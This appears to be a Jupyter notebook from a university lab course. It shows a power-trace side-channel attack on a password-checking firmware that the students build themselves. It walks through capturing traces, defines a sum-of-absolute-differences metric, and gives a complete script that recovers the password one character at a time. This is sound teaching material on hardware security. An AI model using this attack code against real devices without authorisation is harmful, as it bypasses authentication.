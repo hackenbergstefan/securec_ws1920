{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack Password with Timing Analysis II (SAD)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hide_input": true
   },
   "outputs": [],
   "source": [
    "%run '../helper_scripts/Metadata.ipynb'\n",
    "print_metadata()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a href=\"#Basic-Setup\" data-toc-modified-id=\"Basic-Setup-1\"><span class=\"toc-item-num\">1&nbsp;&nbsp;</span>Basic Setup</a></span></li><li><span><a href=\"#Helper-Functions-for-Password-Attack\" data-toc-modified-id=\"Helper-Functions-for-Password-Attack-2\"><span class=\"toc-item-num\">2&nbsp;&nbsp;</span>Helper Functions for Password Attack</a></span></li><li><span><a href=\"#The-sum-of-absolute-differences\" data-toc-modified-id=\"The-sum-of-absolute-differences-3\"><span class=\"toc-item-num\">3&nbsp;&nbsp;</span>The sum of absolute differences</a></span></li><li><span><a href=\"#SAD-password-attack\" data-toc-modified-id=\"SAD-password-attack-4\"><span class=\"toc-item-num\">4&nbsp;&nbsp;</span>SAD password attack</a></span></li><li><span><a href=\"#Disconnect\" data-toc-modified-id=\"Disconnect-5\"><span class=\"toc-item-num\">5&nbsp;&nbsp;</span>Disconnect</a></span></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The last example showed how to attack the password by inspecting and analysing captured traces. In this example we'll see how it is possible to break the password without any detailed look at captured traces."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../helper_scripts/Init.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Build target and upload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET = 'basic-passwdcheck'\n",
    "%store TARGET\n",
    "%run \"$HELPERSCRIPTS/Prepare.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Import helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"$HELPERSCRIPTS/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 2000"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool, Label\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess, fPrint = False):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    if fPrint == True:\n",
    "        print(ret)\n",
    "    \n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    ret = \"\"\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "    \n",
    "    return trace, ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The sum of absolute differences\n",
    "In this example we want to see how a technique called SAD (sum of absolute differences) is useful to auto-detect whether a character was correct or not.\n",
    "Given two traces $t_1, t_2$ their SAD value is defined as:\n",
    "$$\\text{SAD}(t_1, t_2) := \\sum_i \\big| t_1[i] - t_2[i] \\big|,$$\n",
    "where $t[i]$ is the value of trace $t$ at point $i$."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sad(trace1, trace2):\n",
    "    return sum(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is of course not obvious why this helps us distinguishing right and wrong password characters. But, it becomes clear with the following example capture:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace1, _ = cap_pass_trace('a\\n', False)\n",
    "trace2, _ = cap_pass_trace('b\\n', False)\n",
    "trace3, _ = cap_pass_trace('i\\n', False)\n",
    "p = figure(height=200)\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue',\n",
    "       legend='abs(trace1 - trace2) with SAD = {:.2f}'.format(sad(trace1, trace2)))\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', \n",
    "       legend='abs(trace1 - trace3) with SAD = {:.2f}'.format(sad(trace1, trace3)))\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now it is clear how to proceed:\n",
    "\n",
    "## SAD password attack\n",
    "\n",
    "1. Start capturing a wrong character. Let's call this `base_trace`\n",
    "2. Capture further characters and calculate the SAD between this and `base_trace`. If the SAD is greater than a certain value we can be sure that we found the right character.\n",
    "3. Start from beginning incorporating the found right character."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sad_attack(check_level=50):\n",
    "    trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'\n",
    "    password = ''\n",
    "    outputbuf = ''\n",
    "\n",
    "    while 'Welcome' not in outputbuf:\n",
    "        # Capture base_trace with definitly wrong next character\n",
    "        base_trace, _ = cap_pass_trace(password + ' ' + '\\n')\n",
    "\n",
    "        for c in trylist:\n",
    "            # Try character\n",
    "            trace, outputbuf = cap_pass_trace(password + c + '\\n')\n",
    "            # Check if c is correct\n",
    "            if sad(base_trace, trace) > check_level:\n",
    "                print(\"Success: \" + c)\n",
    "                password += c\n",
    "                break\n",
    "\n",
    "    print('Successfully broken password: ' + password)\n",
    "    \n",
    "sad_attack()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
